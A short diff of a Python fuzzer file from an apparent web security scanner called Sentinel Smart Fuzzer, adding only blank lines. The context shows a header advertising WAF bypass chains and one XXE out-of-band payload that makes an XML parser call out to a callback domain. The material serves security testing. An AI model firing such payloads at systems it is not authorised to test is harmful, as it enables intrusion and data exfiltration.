@@ -1,3 +1,4 @@
+
 # scanner/fuzzer.py
 # ──────────────────────────────────────────────────────────────────────────────
 # SENTINEL SMART FUZZER — Elite payload generation with WAF bypass chains,
@@ -478,3 +479,4 @@ class SmartFuzzer:
             # XXE OOB
             f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_domain}/xxe">]><foo>&xxe;</foo>',
         ]
+
